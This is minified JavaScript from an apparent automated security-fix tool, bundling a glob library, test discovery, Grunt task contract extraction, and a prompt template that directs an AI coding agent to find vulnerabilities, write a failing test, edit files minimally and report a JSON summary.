XJ({signal:this.signal,objectMode:!0}),this.results.on("drain",()=>this.resume()),this.results.on("resume",()=>this.resume())}matchEmit(X){if(this.results.write(X),!this.results.flowing)this.pause()}stream(){let X=this.path;if(X.isUnknown())X.lstat().then(()=>{this.walkCB(X,this.patterns,()=>this.results.end())});else this.walkCB(X,this.patterns,()=>this.results.end());return this.results}streamSync(){if(this.path.isUnknown())this.path.lstatSync();return this.walkCBSync(this.path,this.patterns,()=>this.results.end()),this.results}}});import{fileURLToPath as Ku1}from"node:url";var Vu1,j8;var aH=j1(()=>{UX();jD();dH();ND();Vu1=typeof process==="object"&&process&&typeof process.platform==="string"?process.platform:"linux";j8=class j8{absolute;cwd;root;dot;dotRelative;follow;ignore;magicalBraces;mark;matchBase;maxDepth;nobrace;nocase;nodir;noext;noglobstar;pattern;platform;realpath;scurry;stat;signal;windowsPathsNoEscape;withFileTypes;includeChildMatches;opts;patterns;constructor(X,J){if(!J)throw new TypeError("glob options required");if(this.withFileTypes=!!J.withFileTypes,this.signal=J.signal,this.follow=!!J.follow,this.dot=!!J.dot,this.dotRelative=!!J.dotRelative,this.nodir=!!J.nodir,this.mark=!!J.mark,!J.cwd)this.cwd="";else if(J.cwd instanceof URL||J.cwd.startsWith("file://"))J.cwd=Ku1(J.cwd);if(this.cwd=J.cwd||"",this.root=J.root,this.magicalBraces=!!J.magicalBraces,this.nobrace=!!J.nobrace,this.noext=!!J.noext,this.realpath=!!J.realpath,this.absolute=J.absolute,this.includeChildMatches=J.includeChildMatches!==!1,this.noglobstar=!!J.noglobstar,this.matchBase=!!J.matchBase,this.maxDepth=typeof J.maxDepth==="number"?J.maxDepth:1/0,this.stat=!!J.stat,this.ignore=J.ignore,this.withFileTypes&&this.absolute!==void 0)throw new Error("cannot set absolute and withFileTypes:true");if(typeof X==="string")X=[X];if(this.windowsPathsNoEscape=!!J.windowsPathsNoEscape||J.allowWindowsEscape===!1,this.windowsPathsNoEscape)X=X.map((H)=>H.replace(/\\/g,"/"));if(this.matchBase){if(J.noglobstar)throw new TypeError("base matching requires globstar");X=X.map((H)=>H.includes("/")?H:`./**/${H}`)}if(this.pattern=X,this.platform=J.platform||Vu1,this.opts={...J,platform:this.platform},J.scurry){if(this.scurry=J.scurry,J.nocase!==void 0&&J.nocase!==J.scurry.nocase)throw new Error("nocase option contradicts provided scurry option")}else{let H=J.platform==="win32"?SQ:J.platform==="darwin"?x2:J.platform?TQ:FD;this.scurry=new H(this.cwd,{nocase:J.nocase,fs:J.fs})}this.nocase=this.scurry.nocase;let Q=this.platform==="darwin"||this.platform==="win32",Y={...J,dot:this.dot,matchBase:this.matchBase,nobrace:this.nobrace,nocase:this.nocase,nocaseMagicOnly:Q,nocomment:!0,noext:this.noext,nonegate:!0,optimizationLevel:2,platform:this.platform,windowsPathsNoEscape:this.windowsPathsNoEscape,debug:!!this.opts.debug},W=this.pattern.map((H)=>new Z8(H,Y)),[z,G]=W.reduce((H,U)=>{return H[0].push(...U.set),H[1].push(...U.globParts),H},[[],[]]);this.patterns=z.map((H,U)=>{let K=G[U];if(!K)throw new Error("invalid pattern object");return new T7(H,K,0,this.platform)})}async walk(){return[...await new f2(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).walk()]}walkSync(){return[...new f2(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).walkSync()]}stream(){return new g2(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).stream()}streamSync(){return new g2(this.patterns,this.scurry.cwd,{...this.opts,maxDepth:this.maxDepth!==1/0?this.maxDepth+this.scurry.cwd.depth():1/0,platform:this.platform,nocase:this.nocase,includeChildMatches:this.includeChildMatches}).streamSync()}iterateSync(){return this.streamSync()[Symbol.iterator]()}[Symbol.iterator](){return this.iterateSync()}iterate(){return this.stream()[Symbol.asyncIterator]()}[Symbol.asyncIterator](){return this.iterate()}}});var sH=(X,J={})=>{if(!Array.isArray(X))X=[X];for(let Q of X)if(new Z8(Q,J).hasMagic())return!0;return!1};var oH=j1(()=>{UX()});function h2(X,J={}){return new j8(X,J).streamSync()}function wD(X,J={}){return new j8(X,J).stream()}function ID(X,J={}){return new j8(X,J).walkSync()}async function LD(X,J={}){return new j8(X,J).walk()}function y2(X,J={}){return new j8(X,J).iterateSync()}function CD(X,J={}){return new j8(X,J).iterate()}var Bu1,qu1,Zu1,Mu1,Fu1,DD;var PD=j1(()=>{UX();aH();oH();UX();aH();oH();iH();Bu1=h2,qu1=Object.assign(wD,{sync:h2}),Zu1=y2,Mu1=Object.assign(CD,{sync:y2}),Fu1=Object.assign(ID,{stream:h2,iterate:y2}),DD=Object.assign(LD,{glob:LD,globSync:ID,sync:Fu1,globStream:wD,stream:qu1,globStreamSync:h2,streamSync:Bu1,globIterate:CD,iterate:Mu1,globIterateSync:y2,iterateSync:Zu1,Glob:j8,hasMagic:sH,escape:I7,unescape:x8});DD.glob=DD});import{promises as ju1}from"fs";import*as v6 from"path";class tH{defaultIncludePatterns=["**/*.test.js","**/*.test.ts","**/*.spec.js","**/*.spec.ts","**/test/**/*.js","**/test/**/*.ts","**/tests/**/*.js","**/tests/**/*.ts","**/__tests__/**/*.js","**/__tests__/**/*.ts"];defaultExcludePatterns=["**/node_modules/**","**/dist/**","**/build/**","**/.git/**","**/coverage/**","**/*.broken.*","**/*.skip.*"];async discoverTests(X){let J=X.includePatterns||this.defaultIncludePatterns,Q=X.excludePatterns||this.defaultExcludePatterns,Y=[];for(let W of J){let z=new j8(W,{cwd:X.rootDir,ignore:Q,absolute:!0,maxDepth:X.maxDepth||10});for await(let G of z)try{let H=await this.analyzeTestFile(G,X.analyzeContent!==!1);if(H)Y.push(H)}catch(H){console.warn(`Failed to analyze test file ${G}:`,H)}}return Y}async analyzeTestFile(X,J){try{let Q=await ju1.readFile(X,"utf-8"),Y=this.detectTestFramework(Q),W=[],z=[];if(J)W=this.extractTestCases(Q,Y),z=this.extractRelatedFiles(Q,X);return{path:X,content:Q,testFramework:Y,testCases:W,relatedFiles:z}}catch(Q){return console.warn(`Cannot read test file ${X}:`,Q),null}}detectTestFramework(X){if(X.includes("from 'vitest'")||X.includes('from "vitest"'))return"vitest";if(X.includes("from '@jest/globals'")||X.includes("jest."))return"jest";if(X.includes("describe(")&&X.includes("it("))return"jest";if(X.includes("from 'mocha'")||X.includes("require('mocha')"))return"mocha";if(X.includes("from 'jasmine'")||X.includes("require('jasmine')"))return"jasmine";if(X.includes("from 'tap'")||X.includes("require('tap')"))return"tap";return"unknown"}extractTestCases(X,J){let Q=[],Y=this.extractTestBlocks(X);for(let W of Y){let z={name:W.name,description:W.description,functionUnderTest:this.extractFunctionUnderTest(W.content),behavioralExpectations:this.extractBehavioralExpectations(W.content),assertions:this.extractAssertions(W.content,J)};Q.push(z)}return Q}extractTestBlocks(X){let J=[],Q=[/(?:it|test)\s*\(\s*['"`]([^'"`]+)['"`]\s*,?\s*(?:async\s+)?\s*\(\s*\)\s*=>\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}/g,/(?:it|test)\s*\(\s*['"`]([^'"`]+)['"`]\s*,?\s*(?:async\s+)?function\s*\(\s*\)\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}/g,/describe\s*\(\s*['"`]([^'"`]+)['"`]\s*,?\s*\(\s*\)\s*=>\s*\{([^}]+(?:\{[^}]*\}[^}]*)*)\}/g];for(let Y of Q){let W;while((W=Y.exec(X))!==null)J.push({name:W[1],description:W[1],content:W[2]})}return J}extractFunctionUnderTest(X){let J=[/(?:const|let|var)\s+\w+\s*=\s*(?:await\s+)?(\w+)\s*\(/g,/expect\s*\(\s*(\w+)\s*\(/g,/(\w+)\s*\.\s*\w+\s*\(/g];for(let Q of J){let Y=Q.exec(X);if(Y&&Y[1]&&!["expect","jest","vi","sinon"].includes(Y[1]))return Y[1]}return}extractBehavioralExpectations(X){let J=[];if(X.includes("function(")||X.includes("=>"))J.push({type:"function-signature",description:"Function signature must be preserved",requirement:"Parameter names and count should remain consistent",critical:!0});if(X.includes("done()")||X.includes("callback("))J.push({type:"callback-pattern",description:"Callback behavior must be maintained",requirement:"Callback signature and timing should be preserved",critical:!0});if(X.includes("process.platform")||X.includes("win32"))J.push({type:"platform-compatibility",description:"Platform-specific behavior must work correctly",requirement:"Cross-platform compatibility should be maintained",critical:!1});if(X.includes("try {")||X.includes("catch")||X.includes("throw"))J.push({type:"error-handling",description:"Error handling behavior must be preserved",requirement:"Error types and handling patterns should remain consistent",critical:!1});return J}extractAssertions(X,J){let Q=[],Y=/expect\s*\(\s*([^)]+)\s*\)\s*\.([^(]+)\s*\(\s*([^)]*)\s*\)/g,W;while((W=Y.exec(X))!==null){let z=W[1].trim(),G=W[2].trim(),H=W[3].trim(),U="equals";if(G.includes("toBe")||G.includes("toEqual"))U="equals";else if(G.includes("toContain"))U="contains";else if(G.includes("toThrow"))U="throws";else if(G.includes("toHaveBeenCalled"))U="calls";Q.push({type:U,target:z,expected:H,description:`${z} should ${G} ${H}`})}return Q}extractRelatedFiles(X,J){let Q=[],Y=v6.dirname(J),W=[/import\s+.*\s+from\s+['"`]([^'"`]+)['"`]/g,/require\s*\(\s*['"`]([^'"`]+)['"`]\s*\)/g];for(let z of W){let G;while((G=z.exec(X))!==null){let H=G[1];if(H.startsWith(".")){let U=v6.resolve(Y,H);Q.push(U)}else if(!H.includes("node_modules")&&!H.includes("@"))Q.push(H)}}return Q}async findTestsForFile(X,J){return(await this.discoverTests(J)).filter((Y)=>{let W=v6.basename(X,v6.extname(X));if(v6.basename(Y.path).includes(W))return!0;return Y.relatedFiles.some((G)=>G.includes(W)||G===X)})}extractBehavioralContracts(X){let J=[];for(let Y of X)for(let W of Y.testCases)J.push(...W.behavioralExpectations);return J.filter((Y,W,z)=>W===z.findIndex((G)=>G.type===Y.type&&G.requirement===Y.requirement))}}var SD=j1(()=>{PD()});class eH{async extractFromVulnerableCode(X,J){if(X.includes("Gruntfile")||J.includes("grunt.registerTask"))return this.extractGruntTaskContract(J);return this.extractGeneralContract(J)}extractFromTests(X){let J=[];for(let Q of X)for(let Y of Q.testCases){let W=this.buildContractFromTestCase(Y,Q.content);if(W)J.push(W)}return J}extractGruntTaskContract(X){let J=X.match(/grunt\.registerTask\s*\(\s*["']([^"']+)["']\s*,\s*["']([^"']+)["']\s*,\s*function\s*\(\s*([^)]*)\s*\)/),Q={name:"unknown-task",parameters:[],returnType:"void"};if(J){let Y=J[1],W=J[3].split(",").map((z)=>z.trim()).filter((z)=>z.length>0);Q={name:Y,parameters:W.map((z)=>({name:z,type:"string | undefined",optional:!0,validation:["Can be any string","Used as parameter override"]})),returnType:"void",callbackPattern:this.extractCallbackPattern(X)}}return{functionSignature:Q,environmentHandling:this.extractEnvironmentHandling(X),platformCompatibility:this.extractPlatformCompatibility(X),errorHandling:this.extractErrorHandling(X),loggingBehavior:this.extractLoggingBehavior(X),integrationPoints:this.extractIntegrationPoints(X,"grunt-task")}}extractGeneralContract(X){return{functionSignature:this.extractFunctionSignature(X),environmentHandling:this.extractEnvironmentHandling(X),platformCompatibility:this.extractPlatformCompatibility(X),errorHandling:this.extractErrorHandling(X),loggingBehavior:this.extractLoggingBehavior(X),integrationPoints:this.extractIntegrationPoints(X,"general")}}extractFunctionSignature(X){let J=[/function\s+(\w+)\s*\(\s*([^)]*)\s*\)/,/const\s+(\w+)\s*=\s*\(\s*([^)]*)\s*\)\s*=>/,/(\w+)\s*:\s*\(\s*([^)]*)\s*\)\s*=>/];for(let Q of J){let Y=X.match(Q);if(Y){let W=Y[1],z=Y[2].split(",").map((G)=>G.trim()).filter((G)=>G.length>0);return{name:W,parameters:z.map((G)=>({name:G.split(":")[0].trim(),type:G.includes(":")?G.split(":")[1].trim():"any",optional:G.includes("?")||G.includes("=")})),returnType:this.inferReturnType(X),callbackPattern:this.extractCallbackPattern(X)}}}return{name:"unknown-function",parameters:[],returnType:"void"}}extractCallbackPattern(X){if(X.includes("this.async()")){let Q=X.match(/done\s*\(\s*([^)]*)\s*\)/g),Y=Q?Q[0].match(/done\s*\(\s*([^)]*)\s*\)/)?.[1].split(",").map((W)=>W.trim()).filter((W)=>W.length>0)||[]:[];return{name:"done",signature:"this.async()",expectedArgs:Y,behavior:Y.length===0?"Signal task completion without success/failure indication":"Signal task completion with result parameters"}}let J=X.match(/(\w+)\s*\(\s*([^)]*)\s*\).*callback/);if(J)return{name:J[1],signature:J[0],expectedArgs:J[2].split(",").map((Q)=>Q.trim()).filter((Q)=>Q.length>0),behavior:"Standard callback pattern"};return}extractEnvironmentHandling(X){let J=[],Q=[],Y="development",W="No explicit validation";if(X.includes("process.env.NODE_ENV"))J.push("process.env.NODE_ENV"),Q.push("process.env.NODE_ENV");let z=/(?:var|let|const)\s+\w+\s*=\s*([^;]+);/g,G;while((G=z.exec(X))!==null){let H=G[1];if(H.includes("||"))H.split("||").map((K)=>K.trim()).forEach((K)=>{if(K.includes("process.env")){if(!J.includes(K))J.push(K);if(!Q.includes(K))Q.push(K)}else if(K.includes("arg")||K.includes("environment")){if(!J.includes("arg parameter"))J.push("arg parameter");if(!Q.includes("arg"))Q.push("arg")}else if(K.includes('"')||K.includes("'")){if(Y=K.replace(/["']/g,""),!Q.includes(Y))Q.push(Y)}}),W="Uses first truthy value in precedence order"}return{defaultEnvironment:Y,environmentSources:J,precedenceOrder:Q,validationLogic:W}}extractPlatformCompatibility(X){let J=X.includes("process.platform")&&X.includes("win32"),Q="No platform-specific logic detected",Y="";if(J){let W=X.match(/process\.platform\s*===\s*["']win32["']\s*\?\s*([^:]+)\s*:\s*([^;]+)/);if(W){let z=W[1].trim(),G=W[2].trim();Q=`Windows uses ${z}, Unix uses ${G}`;let H=z.match(/["']([^"']*NODE_ENV[^"']*)["']/);if(H)Y=H[1]}}return{windowsSupport:J,platformSpecificLogic:Q,commandPrefixPattern:Y}}extractErrorHandling(X){let J=[],Q="No explicit error handling",Y="Unknown callback behavior";if(X.includes("try {")&&X.includes("catch"))J.push("try-catch exceptions"),Q="Uses try-catch for error handling";if(X.includes("function(err")||X.includes("(error,")){if(J.push("callback errors"),X.includes("if (err)")||X.includes("if (error)"))if(X.includes("done()"))Y="Always call done() regardless of success/failure",Q="Log errors but still call done()";else Q="Handle errors in callback"}if(X.includes("stderr"))J.push("stderr output");return{errorTypes:J,errorHandlingPattern:Q,callbackBehavior:Y}}extractLoggingBehavior(X){let J=[],Q="No explicit success logging",Y="No explicit error logging";if(X.includes("console.log"))J.push("console.log");if(X.includes("grunt.log")){if(X.includes("grunt.log.ok")){J.push("grunt.log.ok");let W=X.match(/grunt\.log\.ok\s*\(\s*([^)]+)\s*\)/);if(W)Q=`grunt.log.ok(${W[1]})`}if(X.includes("grunt.log.error")){J.push("grunt.log.error");let W=X.match(/grunt\.log\.error\s*\(\s*([^)]+)\s*\)/g);if(W)Y=W.join(" + ")}}return{successPattern:Q,errorPattern:Y,logMethods:J}}extractIntegrationPoints(X,J){let Q=[];if(J==="grunt-task"){if(Q.push({type:"grunt-task-system",description:"Must be compatible with grunt task runner",requirement:"Function signature must match grunt.registerTask pattern"}),X.includes("this.async()"))Q.push({type:"async-callback",description:"Uses grunt async pattern with this.async()",requirement:"Must call done() to signal completion"});if(X.includes("exec(")||X.includes("execFile("))Q.push({type:"process-execution",description:"Executes external processes",requirement:"Must execute external commands with proper arguments"});if(X.includes("process.platform"))Q.push({type:"cross-platform",description:"Works on Windows and Unix systems",requirement:"Must handle platform-specific command syntax"})}return Q}buildContractFromTestCase(X,J){if(!X.functionUnderTest)return null;return{functionSignature:{name:X.functionUnderTest,parameters:this.inferParametersFromTest(X,J),returnType:this.inferReturnTypeFromTest(X,J),callbackPattern:this.extractCallbackPatternFromTest(X,J)},environmentHandling:{defaultEnvironment:"development",environmentSources:[],precedenceOrder:[],validationLogic:"Inferred from test patterns"},platformCompatibility:{windowsSupport:!1,platformSpecificLogic:"Unknown from test",commandPrefixPattern:""},errorHandling:{errorTypes:[],errorHandlingPattern:"Unknown from test",callbackBehavior:"Unknown from test"},loggingBehavior:{successPattern:"Unknown from test",errorPattern:"Unknown from test",logMethods:[]},integrationPoints:[]}}generateFixConstraints(X){let J=[],Q=[],Y=[],W=[];for(let z of X){if(J.push(`Function parameter names must remain "${z.functionSignature.parameters.map((G)=>G.name).join(", ")}"`),z.functionSignature.callbackPattern)J.push(`Callback must be called as ${z.functionSignature.callbackPattern.name}(${z.functionSignature.callbackPattern.expectedArgs.join(", ")})`);if(z.environmentHandling.precedenceOrder.length>0)J.push(`Environment precedence: ${z.environmentHandling.precedenceOrder.join(" || ")}`);if(z.platformCompatibility.windowsSupport)J.push("Windows platform support with command prefix logic");if(z.errorHandling.callbackBehavior.includes("done()"))J.push("Error logging using existing patterns");if(Q.push("Replace vulnerable functions with secure alternatives"),Q.push("Prevent injection attacks through input validation"),Q.push("Validate/sanitize user input if needed"),Y.push("Replace insecure functions with secure equivalents"),Y.push("Add input sanitization within existing patterns"),Y.push("Improve error handling while preserving interface"),Y.push("Update internal implementation while preserving external behavior"),W.push("Changing function signature (parameter names/count)"),W.push("Changing callback signature or behavior"),z.platformCompatibility.windowsSupport)W.push("Removing Windows platform support");W.push("Changing environment precedence logic"),W.push("Altering integration patterns")}return{preserveRequired:[...new Set(J)],securityRequirements:[...new Set(Q)],allowedChanges:[...new Set(Y)],forbiddenChanges:[...new Set(W)]}}inferParametersFromTest(X,J){return[]}inferReturnTypeFromTest(X,J){return"void"}extractCallbackPatternFromTest(X,J){return}inferReturnType(X){if(X.includes("return "))return"unknown";return"void"}}import*as QJ from"path";import*as m2 from"fs/promises";class X3{testDiscovery;contractExtractor;constructor(){this.testDiscovery=new tH,this.contractExtractor=new eH}async enhanceContext(X,J,Q,Y={enabled:!0}){if(!Y.enabled)return null;let W=Date.now(),z=Y.discoveryTimeout||30000;try{q.info("[TestAware] Starting test discovery and contract extraction...");let G=await Promise.race([this.discoverRelatedTests(X,J,Q,Y),new Promise((M,F)=>setTimeout(()=>F(new Error("Test discovery timeout")),z))]),H=await this.extractBehavioralContracts(X,J,Q,G,Y),U=this.contractExtractor.generateFixConstraints(H),K=this.determineTestFramework(G,Q),V=await this.determineTestCommand(Q,K),B={relatedTests:G,behavioralContracts:H,constraints:U,testFramework:K,testCommand:V,preserveRequirements:U.preserveRequired,securityRequirements:U.securityRequirements},Z=Date.now()-W;if(q.info(`[TestAware] Enhancement completed in ${Z}ms: found ${G.length} tests, ${H.length} contracts`),Y.verbose)this.logTestAwareDetails(B);return B}catch(G){let H=Date.now()-W;return q.warn(`[TestAware] Enhancement failed after ${H}ms:`,G),null}}generatePromptEnhancement(X){if(!X||X.relatedTests.length===0)return"";let J=`

## \uD83E\uDDEA TEST-AWARE FIX GENERATION
`;if(J+=`

`,J+=`**CRITICAL**: The following tests and behavioral contracts MUST be preserved during your fix.

`,X.behavioralContracts.length>0){J+=`### \uD83D\uDCCB BEHAVIORAL CONTRACTS TO PRESERVE

`;for(let Q of X.behavioralContracts){if(J+=`#### Function: ${Q.functionSignature.name}

`,J+=`**Function Signature:**
`,J+=`- Parameters: ${Q.functionSignature.parameters.map((Y)=>`${Y.name}: ${Y.type}`).join(", ")}
`,J+=`- Return type: ${Q.functionSignature.returnType}
`,Q.functionSignature.callbackPattern)J+=`- Callback: ${Q.functionSignature.callbackPattern.name}(${Q.functionSignature.callbackPattern.expectedArgs.join(", ")})
`,J+=`- Callback behavior: ${Q.functionSignature.callbackPattern.behavior}
`;if(J+=`
**Environment Handling:**
`,J+=`- Default: ${Q.environmentHandling.defaultEnvironment}
`,J+=`- Precedence: ${Q.environmentHandling.precedenceOrder.join(" || ")}
`,Q.platformCompatibility.windowsSupport)J+=`
**Platform Compatibility:**
`,J+=`- Windows support: Required
`,J+=`- Command pattern: ${Q.platformCompatibility.commandPrefixPattern}
`;J+=`
**Error Handling:**
`,J+=`- Pattern: ${Q.errorHandling.errorHandlingPattern}
`,J+=`- Callback behavior: ${Q.errorHandling.callbackBehavior}
`,J+=`
---

`}}J+=`###  REQUIRED PRESERVATION CONSTRAINTS

`;for(let Q of X.preserveRequirements)J+=`-  ${Q}
`;J+=`
### \uD83D\uDD12 SECURITY REQUIREMENTS

`;for(let Q of X.securityRequirements)J+=`- \uD83D\uDD12 ${Q}
`;J+=`
###  ALLOWED CHANGES

`;for(let Q of X.constraints.allowedChanges)J+=`-  ${Q}
`;J+=`
###  FORBIDDEN CHANGES

`;for(let Q of X.constraints.forbiddenChanges)J+=`-  ${Q}
`;if(X.relatedTests.length>0){J+=`
### \uD83E\uDDEA RELATED TESTS TO CONSIDER

`,J+=`Found ${X.relatedTests.length} test files that may be affected by your changes:

`;for(let Q of X.relatedTests.slice(0,5)){if(J+=`**${QJ.basename(Q.path)}** (${Q.testFramework})
`,Q.testCases.length>0){J+=`- ${Q.testCases.length} test cases covering behavioral expectations
`;for(let Y of Q.testCases.slice(0,3))J+=`  - "${Y.name}"
`}J+=`
`}J+=`**Test Command**: \`${X.testCommand}\`

`}return J+=`### \uD83C\uDFAF TEST-AWARE FIX INSTRUCTIONS

`,J+=`1. **BEFORE FIXING**: Read existing tests to understand expected behavior
`,J+=`2. **DURING FIXING**: Ensure your changes preserve all behavioral contracts
`,J+=`3. **AFTER FIXING**: Run tests to verify behavioral preservation
`,J+=`4. **VALIDATION**: Confirm both security fix AND behavioral preservation

`,J+=`**REMEMBER**: Your fix must be INCREMENTAL, not a comprehensive rewrite.
`,J+=`Focus on fixing the security issue while preserving existing functionality.

`,J}async discoverRelatedTests(X,J,Q,Y){let W=Y.testDiscoveryRoot||Q,z=await this.testDiscovery.discoverTests({rootDir:W,analyzeContent:!0}),G=[];if(J.relatedFiles&&J.relatedFiles.length>0)for(let K of J.relatedFiles){let V=await this.testDiscovery.findTestsForFile(K,{rootDir:W,analyzeContent:!0});G.push(...V)}let H=this.extractKeywords(X);for(let K of z)if(this.testContainsKeywords(K,H))G.push(K);return G.filter((K,V,B)=>V===B.findIndex((Z)=>Z.path===K.path))}async extractBehavioralContracts(X,J,Q,Y,W){let z=[];if(W.vulnerableFilePath)try{let H=await m2.readFile(QJ.resolve(Q,W.vulnerableFilePath),"utf-8"),U=await this.contractExtractor.extractFromVulnerableCode(W.vulnerableFilePath,H);z.push(U)}catch(H){q.warn(`[TestAware] Could not read vulnerable file ${W.vulnerableFilePath}:`,H)}if(J.relatedFiles)for(let H of J.relatedFiles)try{let U=QJ.resolve(Q,H),K=await m2.readFile(U,"utf-8"),V=await this.contractExtractor.extractFromVulnerableCode(H,K);z.push(V)}catch(U){q.warn(`[TestAware] Could not read related file ${H}:`,U)}let G=this.contractExtractor.extractFromTests(Y);return z.push(...G),z}determineTestFramework(X,J){let Y=X.map((z)=>z.testFramework).reduce((z,G)=>{return z[G]=(z[G]||0)+1,z},{}),W=Object.entries(Y).sort(([,z],[,G])=>G-z)[0];return W?W[0]:"unknown"}async determineTestCommand(X,J){try{let Q=QJ.join(X,"package.json");if(JSON.parse(await m2.readFile(Q,"utf-8")).scripts?.test)return"npm test";switch(J){case"jest":return"npx jest";case"vitest":return"npx vitest run";case"mocha":return"npx mocha";case"tap":return"npx tap";default:return"npm test"}}catch(Q){return"npm test"}}extractKeywords(X){let J=[],Q=X.title.toLowerCase().split(/\s+/);J.push(...Q.filter((W)=>W.length>3));let Y=X.body.toLowerCase().split(/\s+/);return J.push(...Y.filter((W)=>W.length>4)),J.push("security","vulnerability","injection","xss","sql","csrf"),[...new Set(J)]}testContainsKeywords(X,J){let Q=X.content.toLowerCase();return J.some((Y)=>Q.includes(Y))}logTestAwareDetails(X){q.info("[TestAware] Detailed context:"),q.info(`- Related tests: ${X.relatedTests.length}`),q.info(`- Behavioral contracts: ${X.behavioralContracts.length}`),q.info(`- Test framework: ${X.testFramework}`),q.info(`- Test command: ${X.testCommand}`),q.info(`- Preserve requirements: ${X.preserveRequirements.length}`),q.info(`- Security requirements: ${X.securityRequirements.length}`);for(let J of X.behavioralContracts)if(q.info(`- Contract for: ${J.functionSignature.name}`),J.functionSignature.callbackPattern)q.info(`  - Callback: ${J.functionSignature.callbackPattern.behavior}`)}}var TD=j1(()=>{SD();t1()});var _D={};Y9(_D,{GitBasedClaudeCodeAdapter:()=>_7});import{execSync as h8}from"child_process";var _7;var u2=j1(()=>{qQ();CH();t1();TD();_7=class _7 extends $6{cliAdapter;testAwareEnhancement;constructor(X,J=process.cwd(),Q){super(X,J,Q);this.cliAdapter=new ZQ(X,J,Q),this.testAwareEnhancement=new X3}constructPrompt(X,J,Q){if(Q)return Q;if(this.claudeConfig?.useStructuredPhases)return this.constructStructuredPhasedPrompt(X,J);return`You are an expert security engineer fixing vulnerabilities by directly editing files in a git repository. You have access to file editing tools and will make changes that will be committed to git.

## Issue Details:
- **Title**: ${X.title}
- **Description**: ${X.body}
- **Complexity**: ${J.complexity}
- **Files with vulnerabilities**: ${J.relatedFiles?.join(", ")||"To be discovered"}

## Your Task:

### Phase 1: Locate Vulnerabilities & Check Tests
- Use Grep to find vulnerable code patterns
- Use Read to understand the full context
- Search for existing tests that exercise the vulnerable code
- Identify how the vulnerable code is used (callbacks, promises, etc.)
- Consider using sequential thinking for complex vulnerability analysis

### Phase 2: Red-Green-Refactor Validation
**CRITICAL**: Before fixing, validate the vulnerability exists:
- If tests exist: Run them to establish baseline
- Create or identify a test that demonstrates the vulnerability
- Ensure this test would FAIL on vulnerable code (RED phase)
- Document what malicious input would exploit the vulnerability

### Phase 3: Fix Vulnerabilities In-Place with Compatibility

**\uD83D\uDEA8 CRITICAL REQUIREMENT - YOU MUST FOLLOW THIS EXACT ORDER:**

#### Step 3.1: EDIT FILES FIRST (MANDATORY)
**YOU MUST use the Edit or MultiEdit tools to modify files BEFORE providing JSON.**
-  DO NOT skip to JSON without editing files first
-  DO NOT provide file contents in JSON instead of editing
-  DO use Edit/MultiEdit tools to make actual file changes
-  DO wait for "File updated successfully" confirmation
-  DO make minimal, surgical changes to fix security issues

#### Step 3.2: Preserve Compatibility (WHILE EDITING)
- **PRESERVE API COMPATIBILITY**: 
  - If code uses callbacks, maintain callback interface
  - If changing from callbacks to async/await, add compatibility wrapper
  - Never break existing function signatures
- Maintain existing code style and formatting
- Fix all instances of the vulnerability

#### Step 3.3: Verify Edits Were Applied
**After using Edit/MultiEdit, confirm the files were modified:**
- You should see "File [path] has been updated" messages
- If you don't see these confirmations, the edits didn't work
- Try again with the Edit tool until you see confirmations

Example compatibility wrapper for callback to async conversion:
\`\`\`javascript
// Original method for compatibility
methodName(param1, param2, callback) {
  if (typeof callback === 'function') {
    // Callback style
    this.methodNameAsync(param1, param2)
      .then(result => callback(null, result))
      .catch(error => callback(error));
  } else {
    // Promise style
    return this.methodNameAsync(param1, param2);
  }
}

// New async implementation
async methodNameAsync(param1, param2) {
  // Secure implementation here
}
\`\`\`

### Phase 4: Verify Your Changes (GREEN phase)
- Use Read to verify your edits were applied correctly
- Ensure the code still makes sense and will function properly
- Verify the test that demonstrated the vulnerability now PASSES
- Check that legitimate use cases still work
- Ensure no breaking changes to public APIs

### Phase 5: Provide Fix Summary (ONLY AFTER EDITING FILES)

** PREREQUISITE: You MUST have already edited files with Edit/MultiEdit tools BEFORE this phase**

After you have:
1.  Used Edit/MultiEdit tools to modify files
2.  Seen "File updated successfully" confirmations
3.  Verified your changes were applied

THEN AND ONLY THEN provide a summary in this EXACT JSON format:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation of what was vulnerable and how you fixed it. Include the vulnerability type, severity, and impact.",
  "files": [
    {
      "path": "path/to/file.js",
      "changes": "Complete content of the fixed file after all edits have been applied (read it back with Read tool if needed)"
    }
  ],
  "tests": [
    "Description of test 1 that validates the fix",
    "Description of test 2 that ensures no regressions",
    "Description of test 3 that verifies security improvement"
  ]
}
\`\`\`

**VALIDATION CHECKLIST:**
- [ ] Did you use Edit/MultiEdit tools FIRST? (Required)
- [ ] Did you see "File updated successfully" messages? (Required)
- [ ] Are you providing the JSON AFTER editing? (Required)
- [ ] Does "changes" contain the COMPLETE file content? (Required)

**If any checkbox is unchecked, GO BACK and complete the editing phase first!**

## \uD83D\uDD34 CRITICAL - EXECUTION ORDER IS MANDATORY \uD83D\uDD34

**YOU MUST FOLLOW THIS EXACT SEQUENCE:**

1. **FIRST**: Use Edit/MultiEdit tools to modify the vulnerable files
   - You MUST see "File updated successfully" messages
   - If you don't see these, the edit didn't work - try again

2. **SECOND**: Read the files back to verify your changes were applied
   - Use the Read tool to confirm the vulnerability is fixed

3. **THIRD**: Only after steps 1 and 2, provide the JSON summary
   - Include the complete fixed file content in the "changes" field

** COMMON MISTAKES TO AVOID:**
- Skipping straight to JSON without editing files
- Putting file edits in JSON instead of using Edit tools
- Not waiting for edit confirmation before proceeding

** CORRECT BEHAVIOR:**
- Edit files  See confirmation  Read to verify  Then provide JSON

Remember: The git-based approach requires ACTUAL file modifications via Edit tools, not just JSON descriptions!
3. **Make minimal changes** - Only fix the security issue
4. **Preserve functionality** - The code must still work correctly
5. **Maintain compatibility** - NEVER break existing APIs or interfaces
6. **Validate the fix** - Demonstrate vulnerability exists and is fixed
7. **Fix all instances** - Don't leave any vulnerabilities unfixed
8. **Use relative paths** - Use paths like 'app/data/file.js' not '/app/data/file.js'

